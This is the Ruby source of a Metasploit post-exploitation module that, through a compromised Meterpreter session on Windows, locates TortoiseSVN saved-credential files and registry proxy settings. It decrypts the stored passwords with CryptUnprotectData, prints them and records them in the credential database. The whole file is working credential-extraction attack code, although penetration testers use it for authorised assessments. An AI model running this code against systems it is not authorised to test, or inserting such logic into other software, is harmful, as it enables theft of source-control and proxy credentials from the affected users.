##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather TortoiseSVN Saved Password Extraction',
        'Description' => %q{
          This module extracts and decrypts saved TortoiseSVN passwords.  In
          order for decryption to be successful this module must be executed
          under the same privileges as the user which originally encrypted the
          password.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Justin Cacak'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_railgun_api
              stdapi_sys_config_getenv
              stdapi_sys_config_getuid
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )
  end

  def prepare_railgun
    if !session.railgun.get_dll('crypt32')
      session.railgun.add_dll('crypt32')
    end
  end

  def decrypt_password(data)
    pid = client.sys.process.getpid
    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(128)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')
    end

    return '' if len == 0

    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end

  def get_proxy_data
    # Check if user proxy setting are utilized
    @key_base = 'HKCU\\Software\\TortoiseSVN\\Servers\\global\\'
    http_proxy_password = registry_getvaldata(@key_base.to_s, 'http-proxy-password')

    if http_proxy_password.nil?
      return
    else
      # A proxy with password is utilized, gather details
      print_good('HTTP Proxy Settings')
      http_proxy_username = registry_getvaldata(@key_base.to_s, 'http-proxy-username')
      http_proxy_host = registry_getvaldata(@key_base.to_s, 'http-proxy-host')
      http_proxy_port = registry_getvaldata(@key_base.to_s, 'http-proxy-port')

      # Output results to screen
      print_status("     Host: #{http_proxy_host}")
      print_status("     Port: #{http_proxy_port}")
      print_status("     Username: #{http_proxy_username}")
      print_status("     Password: #{http_proxy_password}")
      print_status('')
    end

    report_cred(
      ip: ::Rex::Socket.resolv(http_proxy_host), # TODO: Fix up report_host?
      port: http_proxy_port,
      service_name: 'http',
      user: http_proxy_username,
      password: http_proxy_password
    )
  end

  def get_config_files
    # Determine if TortoiseSVN is installed and parse config files
    savedpwds = 0
    path = session.sys.config.getenv('APPDATA') + '\\Subversion\\auth\\svn.simple\\'
    print_status("Checking for configuration files in: #{path}")

    begin
      session.fs.dir.foreach(path) do |file_name|
        next if (file_name == '.') || (file_name == '..')

        savedpwds = analyze_file(path + file_name)
      end
    rescue StandardError => e
      print_error "Exception raised: #{e.message}"
      print_status('No configuration files located: TortoiseSVN may not be installed or configured.')
      return
    end

    if savedpwds == 0
      print_status('No configuration files located')
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def analyze_file(filename)
    config = client.fs.file.new(filename, 'r')
    contents = config.read
    config_lines = contents.split("\n")

    print_good('Account Found:')
    line_num = 0

    for line in config_lines
      line.chomp
      line_num += 1
      if line_num == 8
        enc_password = Rex::Text.decode_base64(line)
        password = decrypt_password(enc_password)
      elsif line_num == 12
        if line.match(/<(.*)>.(.*)/)
          # Parse for output
          url = ::Regexp.last_match(1)
          realm = ::Regexp.last_match(2)
          realm.gsub! "\r", '' # Remove \r (not common)
          if line.match(%r{<(.*)://(.*):(.*)>})
            # Parse for reporting
            sname = ::Regexp.last_match(1)
            host = ::Regexp.last_match(2)
            portnum = ::Regexp.last_match(3)
            portnum.gsub! "\r", '' # Remove \r (not common)
          end
        else
          url = '<Unknown/Error>'
        end
      elsif line_num == 16
        user_name = line
        user_name.gsub! "\r", '' # Remove \r (not common)
      end
    end
    config.close

    # Handle null values or errors
    if user_name.nil?
      user_name = '<Unknown/Error>'
    end

    # Output results to screen
    print_status("     URL: #{url}")
    print_status("     Realm: #{realm}")
    print_status("     User Name: #{user_name}")
    print_status("     Password: #{password}")
    print_status('')

    report_cred(
      ip: ::Rex::Socket.resolv_to_dotted(host), # XXX: Workaround for unresolved hostnames
      port: portnum,
      service_name: sname,
      user: user_name,
      password: password
    )

    vprint_status('Should have reported...')

    # Set savedpwds to 1 on return
    return 1
  end

  def run
    # Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.
    uid = session.sys.config.getuid

    if is_system?
      print_error("This module is running under #{uid}.")
      print_error('Automatic decryption will not be possible.')
      print_error('Manually migrate to a user process to achieve successful decryption (e.g. explorer.exe).')
    else
      print_status('Searching for TortoiseSVN...')
      prepare_railgun
      get_config_files
      get_proxy_data
    end

    print_status('Complete')
  end
end
